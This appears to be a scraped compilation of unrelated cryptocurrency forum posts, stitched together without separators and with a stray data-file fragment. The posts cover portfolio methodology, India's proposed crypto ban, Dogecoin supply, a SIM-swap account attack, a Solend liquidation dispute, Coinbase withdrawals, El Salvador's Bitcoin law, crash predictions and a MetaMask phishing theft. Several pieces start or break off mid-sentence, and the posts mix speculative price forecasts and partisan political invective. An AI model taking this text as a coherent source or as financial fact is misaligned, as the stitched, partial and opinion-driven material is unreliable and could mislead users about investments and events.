I don't know when the next Mt.Gox meltdown will occur but I can almost guarantee it will involve Tether. So stay away from it.**What should long term investors do?**For long term holders a good strategy to follow each year is to capture profit each December and swallow the capital gains taxation liability, park a reserve of fiat at Gemini (whose US dollar deposits are FDIC-insured) and simply wait till around late January to early February to re-enter the market at a discount and hold all year until next December. You can keep a small amount in core coins in order to trade around various Q1 opportunities you anticipate. Others may choose to simply do nothing and just keep holding throughout January which is also a perfectly fine strategy. The cyclical correction usually stabilizes toward late January and early February, then we see a rise in March and generally are recovered by end of April. Obviously this decision whether to sell in December to profit on the dip and pay tax liability or to just hold will depend on your individual tax situation. Do your own math sometime in November and follow suit. Essentially revaluate your positions and trim your position sizes if you don't feel comfortable with the losses.#How to construct your portfolio going forward----------------------------------------------------------------------Rather than seeing the correction as a disaster see it as a time to start fresh. If you have been FOMO-ing into bad cryptos and losing money now is a time to start a systematic long term approach to investing rather than gambling. **Follow a methodology for evaluating each cryptocurrency**----------------------------------------------------------------------Memes and lambo dreams are fun and all, but I know many of you are investing thousands of dollars into crypto, so its worth it to put some organized thought into it as well. I can't stress enough how important it is to try and logically contruct your investment decisions. If you follow a set methodology, a checklist and template you will be able to do relative comparisons between cryptocurrencies, to force yourself to consider the negatives and alternative scenarios and also sleep comfortably knowing you have a sound basis for your investment decisions (even if they turn out to be wrong). There is no ideal or 'correct' methodology but I can outline mine:**1) Initial information gathering and filtering**Once I identify something that looks like a good potential investment, I first go to the CoinMarketCap page for that symbol and look at the website and blockchain explorer. * Critically evaluate the website. This is the first pass of the bullshit detector and you can tell from a lot from just the website whether its a scam. If it uses terms like 'Web 4.0' or other nonsensical buzzwords, if its unprofessional and has anonymous teams, stay away. Always look for a roadmap, compare to what was actually delivered so far. Always check the team, try to find them on LinkedIn and what they did in the past. * Read the whitepaper or business development plan. You should fully understand how this crypto functions and how its trying to create value. If there is no use case or if the use case does not require or benefit from a blockchain, move on. Look for red flags like massive portions of the float being assigned to the founders of the coin, vague definition of who would use the coin, anonymous teams, promises of large payouts...etc* Check the blockchain explorer. How is the token distribution across accounts? Are the big accounts holding or selling? Which account is likely the foundation account, which is the founders account? * Read the subreddit and blogs for the cryptocurrency and also evaluate the community. Try to figure out exactly what the potential use cases are and look for sceptical takes. Look at the Github repos, does it look empty or is there plenty of activity?**2) Fill out an Investment Checklist**I have a checklist of questions that I find important and as I'm researching a crypto I save little snippets in Evernote of things that are relevant to answering those questions:* What is the problem or transactional inefficiency the coin is trying to solve?* What is the Dev Team like? What is their track record? How are they funded, organized?* Who is their competition and how big is the market they're targeting? What is the roadmap they created?* What current product exists?* How does the token/coin actually derive value for the holder? Is there a staking mechanism or is it transactional?* What are the weaknesses or problems with this crypto?**3) Create some sort of consistent valuation model/framework, even if its simple** I have a background in finance so I like to do Excel modeling. For those who are interested in that, this [article is a great start](https://hackernoon.com/the-7-things-you-need-to-know-from-the-valuing-cryptocurrency-conference-call-c238095a03b9) and also Chris Burniske has a great blog about using Quantity Theory of Money to build an equivalent of a DCF analysis for crypto.[Here is an Excel file example of OMG done using his model](http://docs.google.com/spreadsheets/d/1FvYGe0TA-rZR00iAV2PDI-B9zba6GpEG1FodECWJDys/edit).  You can download this and play around with it yourself, see how the formulas link and understand the logic.Once you have a model set up the way you like in Excel you can simply alter it to account for various float oustanding schedule and market items that are unique to your crypto, and then just start plugging in different assumptions. Think about what is the true derivation of value for the coin, is it a 'dividend' coin that you stake within a digital economy and collect fees or is it a currency? Use a realistic monetary velocity (around 5-10 for currency and around 1-2 for staking) and for the discount rate use at least 3x the long term return of a diversified equity fund.The benefit is that this forces you to think about what actually makes this coin valuable to an actual user within the digital economy its participating in and force you to think about the assumptions you are making about the future.  Do your assumptions make sense? What would the assumptions have to be to justify its current price? You can create different scenarios in a matrix (optimistic vs. pessimistic) based on different assumptions for risk (discount rate) and implementation (adoption rates).If you don't understand the above thats perfectly fine, you don't need to get into full modeling or have a financial background. Even a simple model that just tries to derive a valuation through relative terms will put you above most crypto investors. Some simple valuation methods that anyone can do* [Metcalfe's Law](https://en.wikipedia.org/wiki/Metcalfe's_law) which states that the value of a network is proportional to the square of the number of connected users of the system (n^2). So you can compare various currencies based on their market cap and square of active users or traffic. * Another easy one is simply looking at the total market for the industry that the coin is supposedly targeting and comparing it to the market cap of the coin. Think of the market cap not only with circulating supply like its shown on CMC but including total supply. For example the total supply for Dentacoin is 1,841,395,638,392, and when multiplied by its price in early January we get a market cap that is actually higher than the entire industry it aims to disrupt: Dentistry. * If its meant to be just used as just a currency: Take a look at the circulating supply and look at the amount that is in cold storage or set to be released/burned. Most cryptos are deflationary so think about how the float schedule will change over time and how this will affect price. Once you have a model you like set up, you can compare cryptos against each other and most importantly it will require that you build a mental framework within your own mind on why somebody would want to own this coin other than to sell it to another greater fool for a higher price. Modeling out a valuation will lead  you to think long term and think about the inherent value, rather than price action.Once you go through this 3-step methodology, you'll have a pretty good confidence level for making your decision and can comfortably sit back and not panic if some temporary short term condition leads to a price decrease. This is how 'smart money' does it.**Think about your portfolio allocation**----------------------------------------------------------------------You should think first in broad terms how you allocate between 'safe' and 'speculative' cryptos. For new investors its best to keep a substantial portion in what would be considered largecap safe cryptos, primarily BTC, ETH, LTC. I personally consider XMR to be safe as well. A good starting point is to have between 50-70% of your portfolio in these safe cryptocurrencies. As you become more confident and informed you can move your allocation into speculative small caps.You should also think in terms of segments and how much of your total portfolio is in each segment:* Core holdings - BTC, Ethereum, LTC...etc* Platform segment - Ethereum, NEO, Ark...etc* Privacy segment - Monero, Zcash, PivX..etc* Finance/Bank settlement segment - Ripple, Stellar...etc* Enterprise Blockchain solutions segment -VeChain, Walton, WABI...etc* Promising/Innovative Tech segment - Raiblocks, IOTA, Cardano...etcYou should also think about where we are in the cycle, as now given so much uncertaintly its probably best to stay heavily in core holdings and pick up a few coins within a segment you understand well. If you don't understand how enterprise solutions work or how the value chain is built through corporations, don't invest in the enteprise blockchain solutions segment. If you are a technie who loves the technology behind Cardano or IOTA, invest in that segment.**Think of your 'circle of competence'**----------------------------------------------------------------------This is actually a term Buffet came up with, it refers to your body of knowledge that allows you to evaluate an investment. Think about what you know best and consider investing in those type of coins. If you don't know anything about how supply chains functions, how can you competently judge whether VeChain or WaltonChain will achieve adoption? This where your portfolio allocation also comes into play. You should diversify but really shouldn't be in much more than around 12 cryptos, because you simply don't have enough competency to accurately access the risk across every segment and for every type of crypto you come across. If you had over 20 different cryptos in your portfolio you should probably think about consolidating to a few sectors you understand well. **Continually educate yourself about the technology and markets**----------------------------------------------------------------------If you aren't already doing it: Read a bit each day about cryptocurrencies. There are decent Youtubers that talk about the market side of crypto, just avoid those that hype specific coins and look for more sceptical ones like CryptoInvestor. If you don't understand how the technology works and what the benefits of a blockchain are or how POS/POW works or what a DAG is or how mining actually works, learn first. If you don't care about the technology or find reading about it tedious, you shouldn't invest in this space at all.#Summing it up----------------------------------------------------------------------I predicted a few days ago that we would have a major correction in 2018 specifically in the altcoins that saw massive gains in Decemeber/early January, and it seems we've already had a pretty big one. I don't think we'll have a complete meltdown like some are predicting, but some more pain may be incoming.Basically take this time to think about how you can improve your investment style and strategy. Make a commitment to value things rather than chasing FOMO, and take your time to make a decision. Long term investment will grant you much more returns as will a systematic approach.Take care and have fun investing :)**Edit March 2018**: Lol looking back I'm regretting starting the title with 'Why we won't have a long term bear market' now, I was more karma whoring with that catchy title than anything.

The right-wing fascist government here is planning to ban all cryptocurrencies. (They are so tone-deaf they called Bitcoin a ['private cryptocurrency'](https://www.newsweek.com/india-drafts-bill-create-government-cryptocurrency-ban-private-cryptocurrencies-exceptions-1566558)). Of course, you can never ban Bitcoin due to its decentralized nature and you might be thinking why I am selling my crypto when I could just as easily use a VPN. Well, the answer is that you don't live under this government. In 2019, the country was undergoing civil unrest with riots in the capital in the [CAA protest](https://en.wikipedia.org/wiki/Citizenship_Amendment_Act_protests) against a bill that discriminated based on religion. They silence journalists, kill protestors, and control not only just the media but also the judiciary. It's. fucked. up.Currently, many [farmers of the country are protesting against the new farm laws](https://en.wikipedia.org/wiki/2020%E2%80%932021_Indian_farmers) which have been deemed anti-farmers and pro-corporate. The government was apathetic to the protest initially and then they were cruel, and brutal. [When Greta Thunberg and Rihana tweeted about the issue](https://indianexpress.com/article/india/rihanna-farmers-protest-mea-7173657/), the government lost its mind and used the Ministry of External Affairs to issue a statement... against a pop star and a teenager. The protestors are also dealt with harshly and Delhi has been turned into a fortress keeping them out; more than a hundred farmers have died but the government remains apathetic.Meanwhile, the Reserve Bank of India prohibited all banks in India from accepting cryptocurrency transactions in 2018. However, the industry went to the Supreme Court and the order was deemed unconstitutional in March last year. The crypto industry rose in India again and just as more people were buying in, the government comes out with a bill that fines a person 3x to 10x their gains on crypto or a jail term up to 10 years, or both. The worst part is that the bill states that it's up to the government to decide how people should dispose of their crypto after its banned. And you know what, it's not beyond this government to take all the crypto for themselves and claim they 'destroyed it'. [All governments have a history with corruption in India](https://en.wikipedia.org/wiki/List_of_scandals_in_India). My exchange is linked to my bank accounts and my central government tax ID, and they can easily track me. That's why I'm selling everything I have, for now, just to wait it out and see what happens with the bill here. I really don't want to sell but I think it's better if I cash out instead of letting the government decide what I should do with my coins or face jail time.I know India is probably not in your circle of concern right now but Bitcoin was about decentralization, about resisting government censorship and it seems the fanatical government is hellbent on making sure nobody can hold crypto by threatening harsh punishments and penalties. However, this is also good for crypto because the government is scared of it due to its growing power, just like its scared of Rihana and Greta Thunberg. I hope the bill never passes but most likely it will and bring an end to the crypto industry here again.EDIT - /u/makeingcent5 gave this post a Platinum Award which comes with 700 coins.

After being involved with crypto for many years I went through a rough patch in 2019 - 2020 where I was on food stamps and begging for rent money on social media.  I was selling my shit on eBay and relying on charity to make it from one month to the next.  I gotta say, I gave zero shits about what was going on in crypto land.

He ranted about the lies surrounding Dogecoin and said he planned to kill himself. All I know is that he lived long enough to post the video. It was quickly removed by mods. So, before you buy Dogecoin, you should know what you are getting. Here's a short summary:Dogecoin has a huge supply. 129 billion coins. 10,000 coins are mined per minute. That's 14 million new coins added to the supply every day, which adds up to about 1 billion coins added every eighty days. Bitcoin has a maximum supply of 21 million coins. So, Dogecoin mints more coins every two days than Bitcoin will ever have in circulation. That's why doge will never be priced like Bitcoin. And, in fact, at about $9 per Dogecoin, Dogecoin would equal Bitcoin in value. Dogecoin has no real ecosystem to make it valuable. It is not fast: 33 transactions per second. ETH 2.0 can handle 100,000 per second. So Dogecoin can't serve as a currency. It seems to have minimum dev work. And it's fueled by people who think they are getting into doge early. If you buy now, you are not. Dogecoin is not the future of anything. With Dogecoin, you are buying hype. And hype might push Dogecoin to 69 cents. Maybe to $1...but there is zero reason for doge to hold that value. In fact, at $1 per Dogecoin, with 1 billion coins added every 80 days, doge would need $1 billion in new investment every few months JUST TO MAINTAIN $1.00 Also, be aware that $129 billion (doge at $1) is a huge market cap. That's the same value as STARBUCKS. And doge has almost zero use-case scenarios. Sure you can buy some Mavs merch. Maybe find some occasional doge fans that accept it as payment.

It came with a link to a password protected (PIN setup when the service was purchased) PDF file that contained the contract for the start of service. I had a friend of mine crack the password to the PDF which ended up being 13371337 (lol).

Since my mobile number was linked to my email account, the attacker was able to now use my number to get the code to reset the password. I thought I had removed the phone number from this account but apparently I missed it. At some point last year I anticipated this happening and switched most of my 2FA to google authenticator instead of SMS, which ended up saving my ass last night.&#x200B;At around 1:44 AM I was thankfully able to regain access to my email account by using my backup email address on file which the attacker thankfully hadn't changed, and also provided some other info to my email provider to prove ownership.At first nothing seemed out of place until I checked my deleted messages folder and saw password reset requests for three different cryptocurrency exchanges I have held accounts on. Two of these don't hold many funds but the third currently holds a fair amount of my coins. (This is another reason you should keep your coins off of the exchange).Time frame was as follows:**11:58 PM:** I get a text about service being activated for my phone number, I lose phone service.**12:08 AM:** My email password is reset. I don't notice this for over an hour.**12:09 AM:** Coinbase password reset request.**12:13 AM:** Kucoin verification code sent to my email.**12:14 AM:** Kraken username request sent to email.**12:15 AM:** Kraken password reset request sent to email.&#x200B;As you can see ***the entire attack lasted less than 20 minutes***, which is terrifying.&#x200B;Thankfully I had Google Authenticator 2FA setup on all of these accounts so the hackers were not able to gain access and drain my funds. Anyone using SMS verification should switch to Google Authenticator because this is the one thing that kept my coins safe. I still need to recover my phone number and at this point I feel like I should change my number or carrier. My mobile carrier only requires a 4 digit pincode to login and make changes which is probably one of the weakpoints that allowed this attack to happen.My information was leaked in the Ledger breach that happened last year and I am positive that this leak is what caused me to be attacked last night. I am sure I am on a list being passed around and some of you might be as well. Please exercise caution, secure your passwords and enable Google Authentication and 2FA on everything you can.Edit: So I spent all day at the carrier stores to get this figured out. Since my number was ported over, then cancelled, I was unable to port it back to my original carrier to finish out my month of service. I went to Metro by T-Mobile and was able to get my number back but I had to buy a new phone since my current device is not unlocked.

This alone accounts for a huge % of borrowing on Solana, and now this position is under a liquidation threat. The whale is not closing their position. In most protocols like Compound, or AAVE, Maker etc, this will result in an onchain liquidation. Infact we have seen many such large liquidations on AAVE And Maker recently, and everything has worked as expected. However such a large liquidation in an illiquid market and unstable network like Solana is likely to have vastly damaging consequences. Solana network has already gone down and halted half a dozen time. The Solend team explains what could happen to the network:>This  could cause chaos, putting a strain on the Solana network. Liquidators  would be especially active and spamming the liquidate function, which  has been known to be a factor causing Solana to go down in the past.  >  >**Letting a liquidation of this size to happen on-chain is extremely risky.**  DEX liquidity isn't deep enough to handle a sale of this size and could  cause cascading effects. Additionally, liquidators will be incentivized  to spam the network in an effort to win very lucrative liquidations.  This has been known to cause load issues for Solana in the past which  would exacerbate the problems at hand.So to prevent this, they are proposing to literally steal the user's funds and execute OTC trades:>Grant  emergency power to Solend Labs to temporarily take over the whale's  account so the liquidation can be executed OTC and avoid pushing Solana  to its limits. This would be done via a smart contract upgrade.  Emergency powers will be revoked once the whale's account reaches a safe  level.When shit starts to implode, all the true colors of decentralization comes out.

I don't know about you guys but after I get my ALGO's withdrawn I'm finding an alternative to CoinBase. They have officially lost my business which is a shame because I've used them since getting into crypto.They did this exact same thing before the 1st governance period in September and people lost out on signing up. This is no different than what Robinhood did with GME stock. It just shows that CEX's need regulation desperately and we're currently at the mercy of Coinbase assholes.There have also been other strange things between Coinbase and Algorand. For the longest time they had Algorand listed as an ERC-20 token. Additionally they commonly do not post updated/correct news for Algorand. A few days ago they listed Securitizes Tokenization of Down Jones Index Funds as happening on Ethereum instead of Algorand, since then they've taken it down from Ethereum but haven't posted it to Algorand news.This all smells a bit fishy.  I have been having this feeling for a while that coinbase is deliberately trying to undermine Algorand.Does anyone know of a good alternative to Coinbase and Binance in the US?&#x200B;EDIT 1: They canceled my withdrawal after over 24 hours pending and said 'Blockchain transaction was compensated'. I'm wondering if I should try to withdraw again or convert to another coin and transfer off.EDIT 2: Tried withdrawing again and it canceled almost immediately and said the same thing 'Blockchain transaction was compensated.' I'm pretty sure they still took my .002 ALGO transaction fee though. CB is fucking us over royally.EDIT 3: Tried withdrawing once more, instant withdrawal cancel with same reason as before. I'm done trying to withdraw tonight. Will try again tomorrow in the AM and update the post.EDIT 4: I was finally able to withdraw my ALGO's today. Look's like Coinbase most likely saw this post and bought more ALGO. The amount of ALGO in Coinbase 2 doubled and magically withdrawals were reenabled. Which means this was 100% a liquidity issue, and not a technical issue. Thank you everyone for contributing, I'm proud to be a part of this community. The elites get scared when all us little guys work together, never forget how powerful we are when we work collectively. This is the exact reason why we are all here, so huge monolithic entities can't dictate and control our lives without any recourse.EDIT 5: MAKE COINBASE SQUIRM. Withdraw everything. Coinbase 1 is down to 351 ALGO and Coinbase 2 is down to <1 Million ALGO. Let's clean them out. Hopefully they will learn not to do this again.EDIT 6: I've been reading some people are still having problems withdrawing. ",False,Coinbase has become the new Robinhood.

Banks processed 200 billions of transactions last year against what, 200 million bitcoin transactions? You don't have to be a genius at math to see that there's no way bitcoin would win if it had the same amount of users and transactions. I'm not even getting into the argument that there are millions of people working for banks who likely would be working elsewhere and generating co2 emissions nevertheless. Those people work on different areas that you like it or not, are 'features' bitcoin doesn't have, banks transaction output is not necessary related with their co2 emission because they do a lot more than sending money from A to B, you can't say the same about bitcoin, transactions = big energy output.  'but defi is the future, we don't need banks'. You may be right, but if you look at sites like nexo/celsius, they are still companies with employees, they are competing with banks providing lendings, customer supoort, cards and insurance, not bitcoin. And they are doing fine.'the media attacks crypto even though most a lot of coins aren't using PoW or will move to something else in the near future'. Hmmm, so you are saying there are better solutions out there and still its better to not talk about bitcoin's energy waste? Sorry, but this is just delusional. Crypto is at its core pushing technology forward and breaking paradigms, and with more adoption it also comes spotlight. If you look into the crypto space in 5 years and see that most coins and decentralized platforms are using something different than pure PoW, and bitcoin is still using PoW and consuming 10x energy from what it does now, you should think that's there's the possibility governments could act against mining, this year you saw hash rate drop with government-instituted blackouts in China, it wouldn't take much for countries to criminalize PoW mining if bitcoin is the only coin doing that and pretending nothing is happening while shouting 'I'm the king'.

How did we get here?Since Nayib Bukele announced that Bitcoin will become legal tender in El Salvador, you guys preferred profits over people. Why? Well, Nayib Bukele used his popularity to trick everyone he is a 'cool guy', willing to sacrify himself in the name of the people. But, yeah he is just a Trump-wannabe that uses people's ignorance to stay popular. For example, he is blaming George Soros for pretty much eveything:https://imgur.com/gallery/XGD0o9PYeah, everything: https://imgur.com/gallery/yRqyZV1From accusing Human Rights Watch director ob being financed by George Soros: https://imgur.com/gallery/IyXFeBhTo accuse journalists of being paid by Soros: https://imgur.com/gallery/1CscRa4https://imgur.com/gallery/JXUDigcAnd even accusing congressmen/congresswomen of being financed by Soros because they supported the Engel List (A list of corrupt politicians in Central America)https://imgur.com/gallery/XGD0o9PBonus track: Nayib Bukele even tried to interfere in a local US election, by asking people not to vote for a Congresswoman:https://imgur.com/gallery/A9ytFTBYou did it reddit, you are supporting a President who is using the same ultra right-wing tactics that Trump used. Now, what's going on right now in El Salvador? Darkness. No really, we are being left on the dark. The Parliament approved the Bitcoin Law in LESS than six hours, and it was done very late at night:https://diarioelsalvador.com/asamblea-cerca-de-aprobar-el-bitcoin-como-moneda-de-curso-legal/90324/Some of our congressmen didn't even know what they were voting for, for real:https://www.elsalvador.com/noticias/nacional/diputado-reynaldo-cardoza-no-entiende-bitcoin-apoyo-salvadorenos/871633/2021/However, passing the law wasn't enough, since our country is still recovering from the effects of the pandemic. How is the government funding the Bitcoin Law? By reducing the education, and health budget and using that money to built the Bitcoin infraestructure: https://www.laprensagrafica.com/elsalvador/Restan-fondos-a-Salud-Educacion-y-asignan-a-Ley-Bitcoin-20210830-0081.html(BTW I thought you guys were against reducing education budgets)How is that money being used? We don't know. All of the information regarding the construction of Chivo ATMs, purchasing Chivo ATMs, purchasing Bitcoins, and the USD $30 bonus is NOW classified information. There you have it, we don't know who was awarded the lucrative contracts to build and equipt the Chivo ATMs. That hasn't stopped Nayib Bukele of proudly making Bitcoin related announcements:https://imgur.com/gallery/jidE0oIhttps://imgur.com/gallery/p26xqnlhttps://imgur.com/gallery/RdYxP1fhttps://imgur.com/gallery/ZtNqni5 (For real, no one knows about the costs of construction)People are against using Bitcoin as legal tender. They don't care if someone trades Bitcoin/Ethereum/Ada/Shiba/Solana, the people living in El Salvador don't want is as a legal tender.

Even worst, old people cannot even understand what a password is. If you think that we 'need to educate people about Wallets and Cryptocurrencies because it is the future', well come here and teach Salvadorans from rural areas about how to use a Wallet. Purchase a plane ticket and go to places like Cacaopera, Sesori, Chirilagua, San Alejo, Conchagua, and teach people about 2FA and Wallets. Don't get me wrong, I am not against Cryptocurrencies. I have in my portfolio BTC, SOL, DODGE, ADA, ETH, and even DOT. I tried teaching people about Wallets, its uses and how easy is to send money across the country or the world. It is not an easy task, and it requires at least two years of educating people. Finally, I was banned from /r/BTC for saying that people here in El Salvador will be forced to use BITCOIN.

The inflation rate is now too much to ignore as the people realize that their buying power is deteriorating faster and faster with little being done about it. As money is harder to get with the Fed reducing its balance sheet, there will be less money to invest into Crypto and the market.# The Crash Has Already StartedWhen the Fed announced it was going to be raising interest rates, I warned about a market crash in a post I made just 10 days ago. Unfortunately, the crash I was talking about has already started as the stock market has started going down very intensely.[Nasdaq Index Falling](https://preview.redd.it/c1prsr60x0d81.png?width=843&format=png&auto=webp&v=enabled&s=9b99de9c7484ff94fef5d094639a23642155ff7e)The pace at which the stock market is going down can very likely cause a situation like we've seen in 2008. This is going to cause panic and sell offs among people. We can already see people cashing out their stock market gains due to recent price action.# Surging Inflation and Market CrashIf we see the history, every time there was high inflation, the Fed artificially triggered a market crash by aggressively increasing interest rates.[Inflation and Interest rate correlation](https://preview.redd.it/wd2srkb9x0d81.png?width=982&format=png&auto=webp&v=enabled&s=7b5f1b85ca4a3d6391366e947ad817a6503b8a33)This rise in interest rate and the planned decrease of the Fed's balance sheet is going to have a severe impact on the market as people start borrowing less, spending less and investments into all assets start to dwindle.# Biden Approval Rating[Approval Ratings Fall Sharply Due To Inflation Concerns](https://preview.redd.it/tbvvccadx0d81.png?width=1281&format=png&auto=webp&v=enabled&s=92a7d823dc5f2d5fe5d8d5ff38f00312168470ea)With more and more inflation, people are losing trust in the Government and the approval rating is going down. The main reason behind this huge fall in approval rating is inflation, and the government needs to tackle inflation if they want to keep their approval rating from falling even lower as the public takes notice of their bills. The approval rating is a sign that the government needs to tackle inflation if it wants to keep public support.# The Sell-off and the OpportunityWith the market crash ahead being very likely, people are taking their money out faster and faster. The Fed is no longer giving them free money very soon. The amount of people that are buying assets very low considering the current situation, and it is likely going to start going down as the interest rates are yet to be increased, which is when we will see the peak effects of the upcoming crash.However, when crashes are at their peak, they leave most assets EXTREMELY undervalued. These are the times when you want to dump money into things like Crypto, which can rise extremely fast during a bullish market.# Crypto's Correspondence With the Stock MarketThe Cryptocurrency market is strongly correlated with the stock market, especially after more and more institutions have started to invest in Crypto. The Crypto market WILL react if there is a downtrend in the general economy. That is basically the reason we saw another dip in Crypto's prices today.**TLDR**: The Fed will be tightening its monetary policies due to inflation and the stock market has started to crash.

The rest is still there but disappearing slowly in front of my eyes.You can see all the transactions from this morning how he/she is cleaning up.Unfortunately there doesn't seem to be anything I can do other than jumping on the occasional ETH transfer they are making in so I can sweep it out.The only reason I haven't shared my secret phrase with the whole world is a quiet hope I might one day get it back. But if  that's never going to happen maybe I should share it with you all. After all it would amuse me if someone else steals it before @scofield#0471 takes it all.....EDIT: I can see people asking why am I not moving the coins out. The answer is I really, really, really tried. However there seems to be script which instantly transfer the coins to a different wallet, no matter what I type in for gas fees or the address. So far I failed on ALCX, on YFI, on SLP, on AAVE - so I have given up as I don't know what to do a setting up a script myself is beyond my abilities. Whenever I add in ETH, all it does is makes its easier to the bastard to take my coins. So all I can literally do is watch right now.SECOND EDITI was sent a link to a site which was going to validate my MM extension. The site looked real enough that I clicked on it and entered my security phrase. That was where I suddenly blew up 6 years worth of HODLing in one go.THIRD EDITNormally I am hyper sensitive to security and very very wary of online support from strangers. However, due to a rare combination of sleep deprivation from staying up late to watch the Euro 2020 final, and not paying attention when I should have I made the fatal error of falling for what is now obviously a elaborate con. I'm so used to clicking approve on Defi sites to connect to wallets that my guard has as down and this looked genuine enough.By the time I realised what was happening it was too late. I logged into MM from a MacBook as my original wallet was on pc, but it made no difference. They initially took 8 ETH, some sushi and old GNT I forgot to convert. With no gas fees the raid stopped. So I thought I would be quick and add a little gas and try and take some out. That didn't work - no matter what I big in gas fees it was either immediately outbid (lost my aave and STETH) or accepted and went to another wallet which I didn't recognise (lost my ALCX there). Later the fucker started liquidating my assets and put gas in to do this. I managed - and this was through the most frantic clicking and accepting any fucking gas bid at the highest price  to transfer out the ETH to a separate wallet. I managed to get some out which slowed the attacks as there was no ETH to pay for the gas. This would happen every hour and I managed to get about 0.05 ETH LOL This was totally my mistake and not due to SNX, who to be fair, warn you not to do what I did. But I was tired, had sent a message to their tech support sub and instead of reading the warning, ignored it like a noob so yeah - I own this and it's my fault.To those of you who think this is fake, I hope it never happens to you. I had to take a day off work to watch this slow motion disaster - I am sitting with a sick feeling, with pounding chest and periodically start tearing up which I can only assume is a slow motion panic attack. I have told my wife who is understandably shocked. When it all goes, I get to tell the rest of family that I got fucked over through ONE SINGLE LAPSE OF JUDGEMENT.I posted this as a warning to the bulk of the community who could just as easily have fallen for the sameI used to look down on exchanges but they all look safer as least they have 2FA which MM lacks.I'm pretty much done now with believing crypto will only change the world for the better and for the first time have been thinking, bring on more fucking regulation and make every wallet linked to an ID  - that way one day I can find out the bastard who cleaned me out and will spend what I have left on justice.FOURTH EDITThank you so much to everyone for their sympathy and support. To those of you telling me I'm dumb /stupid / foolish for so much holding on MM, thank for the comments but after the first 100 I stopped reading them as they get dull quickly. It was a mistake to leave so much on MM and with hindsight, the fact that my ledger wasn't letting me connect to some Defi sites was an obvious flag rather than an obstacle.So since this afternoon, I was recommend the flashbots service on discord by some of you. With some (read massive) trepidation about using discord again, I posted my details and one of their whitehat guys Alex got in touch. I won't give all the details for now as he's still on the case but he already rescued just over 40 steth that was staked on curve as a ETH/STETH LP pool. I'm overjoyed as that's $85k that I had written off now back (and in a ledger before any of you ask).I'm hopeful as to what happens to the remaining $35k but it already feels like a fuck you to the thief.Thanks to those of you who told me some of my stolen money may have gone to kraken, I'm messaging them so I hope they can freeze the money and if I'm lucky even help ID the counterpart (not holding my breath though as I don't know ifs it's real and whether they will help or not).With respect to the site I clicked on, DM if you really want to know but I left it off here in case someone else clicks on it and makes the same mistake I did. I've got in touch with the domain hosts to ask for their help in identifying the thief.Obviously it not the best day in the world but feels a hell of a lot better than it did a few hours ago.FIFTH and hopefully final editThank you to everyone who has sent positive messages of support, both below and in the chat. They have really helped, especially at the start when I was super stressed with indescribable feeling of watching my account get emptied in front of my eyes and being powerless to do anything about it. The (useful) advice from people was helpful and I am especially thankful that the flashbots teams was recommended.Alex has been been awesome. After he verified that the account was actually mine he stepped to stop the bleed (and I appreciated the fact that both the groups on discord and even this sub want to fact-check this to make sure it's not a scam or a lie to flame someone). He set up a burner to remove incoming ETH which meant the thief couldn't take more as there was no gas on the account. He then started to work on moving out the remaining coins to a safe wallet. At the time of writing he's retrieved 117k from the 120k that was left (using this mornings prices). There's a bit left which will hopefully come over but given how much was taken this am, that's a rounding error on what I lost. For those of you who need his details DM or wait as I'll edit one last time and add his Twitter account when this is all over and I'm calm. He has been amazing and whilst they ask for a modest fee it's well worth it.Thanks to Kraken for reaching out and apologies to SNX if it looked like I was blaming them for my mistake. Hopefully Kraken can help but I'm also going to message a lot of the other exchanges too - anything I can do to make the money hard to get for the thief will make me happy and maybe it might even get him caught (but really not holding my breath on that).For those of you who keep wondering (1) no, I am not doing this for moon farming as making a few dollars and getting karma in no way makes up for a hit, (2) this isn't a new account. I've been on Reddit for years but am usually silent as the chats can get poisonous quickly, (3) even I knew it was risky leaving so much on a hot wallet but I have used MM for a long time and found Ledger to be challenging with some Defi. I really wish I had been more careful but that's done. I don't blame anyone other than myself and the bastard who stole my coins but wish MM had 2FA which would have killed this or a way to hard freeze your account instantly which again would stop the bleed and work out a recovery and (4) for all of you who are sitting on your high horse lecturing me on how dumb this is and why you should never use your private data online - I fully understand and agree with your point of view, as YESTERDAY I would have been like YOU safe in the knowledge that nothing like this would ever happen to ME..It's been a hell of day but I'll be fine with time.SIXTH AND FINAL EDITOkay so it been a surreal 24 hours. For those of you who want the full sequence of events it's basically this.I have a few different accounts but started using MetaMask heavily in recent months. Basically because Argent was heavy in gas prices and my ledger didn't always connect to some of the DEFI sites I stitched to MM. Thanks to a run up in crypto market valuations, and some small trades and staking, the $20k was playing with 6 months ago in the hot wallet had became around $250-260k yesterday.My first mistake was leaving such a large amount on MM. In fact I had been actively considering moving some of it but with hindsight waited too too long. At times gas prices on ETH have been insane and was my pure bad luck that yesterday was one of the cheapest days around where tx were a few dollars rather than $20-70 which I'd seen in previous weeks. Trying to save a few hundred bucks turned out to be a very bad decision.With hindsight, I wish I had got up and gone to work and the worst that would have happened would have been feeling deeply disappointed by the England performance the night before.  Instead I went on to make one of the most expensive mistake of my life. I decided that yesterday I would finally get around to messaging the help desk at the discord chat for SNX and ask if they could help me with some SNX I had deposited there on the L2 wallet. The problem was, that I was able to see the amount of SNX on their Optimism mainnet which showed SNX token only but not but not my ETH, whilst the Ethereum mainnet showed my ETH and other alts but not the SNX tokens.I went to the sub and asked for help in the chat. Got no response and tried a bit later. That time I got 3 people replying in private chats each claiming to be from SNX. Whilst the SNX sub warns against this, I was tired and assumed that maybe it was like some of the other subs where people can advise you if the mods are busy.To my misfortune I replied to the scammer explaining the problem. He basically told me my MM wallet wasn't syncing back to the network and I should validate it. That sounded plausible given I couldn't see my total balances and also in recent weeks I've faced a glitch as time where the wallet balance comes up a zero for up to a minute when I first open it so thought maybe he's right.To help, he sent a link to quite a detailed looking site which looked real enough and unfortunately, thanks to weeks of linking random DEFI sites to my MM wallet  I had become unfortunately desensitised to connecting to random pages and accepting connections to my walletWhen I tried the link on the fake site, it wasn't working apparently so Scammer suggested I try again. This time, I figured maybe I should try the option to connect to my wallet by entering my private pass phrase. Yes I know it was dumb NOWYes I realise it's my fault.I'll live with this expensive mistake for a long time.A strange set of events in which I was super tired, not nearly alert enough and my warning radar was off meant I went for the most basic and simple phishing scam. To those of you on your high horses laughing about how this can never happen to you - good luck and I hope you carry on living perfect lives in which you never make a mistake.A few mins pass as the scammer is still engaged on the discord chat explaining it will take some time. He then causally asks me if I have a ledger and want to sync that too.At that instant, I suddenly realise what I've done and get a cold sweat. Why the fuck should he ask that unless.I check my MM wallet on zapper.fi and see that the wallet balance has suddenly dropped. I'm now missing $20k and a quick check shows my 8 ETH, some sushi and some Golem which I had are gone.  I start to get super angry that I've lost 8 coins. After a few mins I calm down and suddenly realise that the only reason I haven't lost more is there is now zero ETH on my account so no way to do more transactions.It's likely that he must have set up a copy of 